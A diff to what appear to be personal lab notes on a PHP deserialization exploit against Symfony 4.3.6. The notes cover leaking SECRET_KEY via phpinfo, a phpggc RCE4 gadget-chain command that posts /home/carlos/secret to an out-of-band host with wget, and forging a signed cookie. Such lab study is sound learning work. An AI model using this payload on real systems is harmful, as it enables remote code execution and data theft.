@@ -4551,9 +4551,10 @@ java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAM
 
 >Exploit steps to perform a PHP deserialization with a pre-built gadget chain.  
 
-1. Request the ```/cgi-bin/phpinfo.php``` file to find the leaked ```SECRET_KEY``` information about the website.  
-2. Generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony ```phpggc Symfony/RCE4 exec 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0```.  
-3. Construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained.  
+1. Modify the cookie in the `my-account`. An Internal server Error is generated with the PHP framework and version ==> Symfony 4.3.6  
+2. Request the ```/cgi-bin/phpinfo.php``` file to find the leaked ```SECRET_KEY``` information about the website.  
+3. Generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony ```phpggc Symfony/RCE4 exec 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0```.  
+4. Construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained.  
 
 ```php
 <?php
